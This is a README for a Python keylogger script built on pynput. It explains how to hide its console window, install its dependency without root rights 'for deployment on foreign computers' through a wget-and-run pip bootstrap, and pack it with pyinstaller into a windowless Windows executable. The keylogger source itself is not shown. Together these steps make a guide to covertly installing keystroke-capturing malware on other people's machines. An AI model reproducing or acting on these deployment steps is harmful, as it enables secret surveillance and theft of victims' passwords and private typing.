# Python 3
## Requirements
Needs to be run in /home/user
pip3 pynput

## Run on Linux
To make sure the console does not appear when running this script save it as a *.pyw file

### Install pynput without root rights for deployment on foreign computers
wget https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py --user
cd .local/bin
./pip install pynput --user

## Pack for Windows
How to pack it with pyinstaller. This has to be done in windows environment.

python3 -m venv env
source env/bin/activate
pip3 install -r requirements.txt
pyinstaller --onefile -w -F --paths env/lib/python3.8/site-packages keylogger-usage.pyw

After running this you find the error log in 
<code>build/keylogger-usage/warn-keylogger-usage.txt</code>
which have to be inspected and the *.exe file in 
<code>dist/keylogger-usage</code>

### Alternative way for Windows with cx_Freeze
https://stackoverflow.com/questions/55312146/how-to-include-only-needed-modules-in-pyinstaller

## Source
https://nitratine.net/blog/post/python-keylogger/
https://nitratine.net/blog/post/convert-py-to-exe/#pyinstaller